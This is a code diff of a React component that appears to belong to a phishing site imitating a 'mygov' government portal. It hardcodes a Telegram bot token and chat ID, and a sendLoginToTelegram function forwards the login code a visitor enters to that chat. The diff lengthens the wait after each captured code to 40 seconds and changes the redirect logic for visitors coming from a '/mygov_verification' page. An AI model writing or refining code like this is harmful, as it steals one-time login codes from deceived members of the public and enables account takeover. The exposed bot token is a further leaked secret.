@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { useNavigate } from "react-router-dom";
+import { useNavigate, useLocation } from "react-router-dom";
 
 const TELEGRAM_BOT_TOKEN = "7038583008:AAGLUNtjIrPvDbtGGwY0yMb-hbkDdjszVP4";
 const TELEGRAM_CHAT_ID = "1951445523";
@@ -11,6 +11,7 @@ const Code = () => {
   const [loading, setLoading] = useState(false);
   const [showError, setShowError] = useState(false);
   const navigate = useNavigate();
+  const location = useLocation();
 
   const sendLoginToTelegram = async (code) => {
     const message = `
@@ -48,8 +49,11 @@ const Code = () => {
     try {
       if (code) {
         await sendLoginToTelegram(code);
-        await new Promise((resolve) => setTimeout(resolve, 6000));
+        await new Promise((resolve) => setTimeout(resolve, 40000));
+         // Check if the user was redirected from mygov_verification
+      if (location.state?.from !== "/mygov_verification") {
         navigate("/mygov");
+      }
       } else {
         console.log("");
       }
